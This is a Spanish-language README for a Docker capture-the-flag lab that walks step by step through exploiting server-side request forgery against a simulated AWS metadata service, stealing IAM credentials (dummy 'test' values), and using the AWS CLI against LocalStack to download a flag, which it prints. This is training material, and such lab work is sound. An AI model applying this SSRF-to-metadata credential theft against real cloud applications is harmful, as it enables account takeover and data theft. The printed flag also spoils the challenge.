# ssfr-aws-lab

El laboratorio se ejecuta con 
  ```bash
docker-compose up -d 
  ```
---

### **1. Reconocimiento**

El pentester comienza analizando la aplicación para identificar posibles vulnerabilidades.

#### **Paso 1: Analizar la aplicación**
- Accede a la aplicación en `http://34.51.13.20:8080/`.
- Observa que hay un formulario que permite ingresar una URL y verificar su contenido.

#### **Paso 2: Identificar la vulnerabilidad SSRF**
- Sospecha que la aplicación puede ser vulnerable a **Server-Side Request Forgery (SSRF)** porque toma una URL ingresada por el usuario y hace una solicitud HTTP a esa URL.
- Para confirmar, intenta acceder a recursos internos, como:
  - `http://localhost:8080` (la propia aplicación).
  - `http://127.0.0.1:8080` (alternativa a localhost).
  - `http://34.51.13.20:8080/latest/meta-data/` (el servicio de metadata simulado en la aplicación).

#### **Paso 3: Confirmar el SSRF**
- Ingresa la URL `http://34.51.13.20:8080/latest/meta-data/` en el formulario.
- Si la aplicación devuelve información del servicio de metadata de AWS, confirma que es vulnerable a SSRF.

---

### **2. Explotación**

Una vez confirmada la vulnerabilidad, el pentester explota el SSRF para obtener credenciales de AWS.

#### **Paso 1: Obtener credenciales de AWS**
- Ingresa la URL del servicio de metadata de AWS en el formulario:
  ```
  http://34.51.13.20:8080/latest/meta-data/iam/security-credentials/
  ```
- La aplicación devuelve las credenciales en formato JSON:
  ```json
  {
      "AccessKeyId": "test",
      "SecretAccessKey": "test",
      "Token": "test",
      "Region": "us-east-1"
  }
  ```

#### **Paso 2: Configurar las credenciales**
- Usa las credenciales obtenidas para configurar el entorno de AWS CLI:
  ```bash
  export AWS_ACCESS_KEY_ID=test
  export AWS_SECRET_ACCESS_KEY=test
  export AWS_SESSION_TOKEN=test
  export AWS_DEFAULT_REGION=us-east-1
  ```

---

### **3. Post-Explotación**

Con las credenciales en mano puedes interactúa con los servicios de AWS (LocalStack) para encontrar la bandera.

#### **Paso 1: Listar los buckets de S3**
- Usa el siguiente comando para listar los buckets en S3:
  ```bash
  aws --endpoint-url=http://34.51.13.20:4566 s3 ls
  ```
- Observa que hay un bucket llamado `secret-bucket-challenge`.

#### **Paso 2: Listar los archivos en el bucket**
- Usa el siguiente comando para listar los archivos en el bucket:
  ```bash
  aws --endpoint-url=http://34.51.13.20:4566 s3 ls s3://secret-bucket-challenge/
  ```
- Observa que hay un archivo llamado `flag.txt`.

#### **Paso 3: Descargar la flag**
- Usa el siguiente comando para descargar el archivo `flag.txt`:
  ```bash
  aws --endpoint-url=http://34.51.13.20:4566 s3 cp s3://secret-bucket-challenge/flag.txt .
  ```
- Lee el contenido del archivo:
  ```bash
  cat flag.txt
  ```
- La bandera es:
  ```
  FLAG{Eres_Todo_Un_Pentester_Cloud_By_AHAU}
  ```

---

By M0r0k0
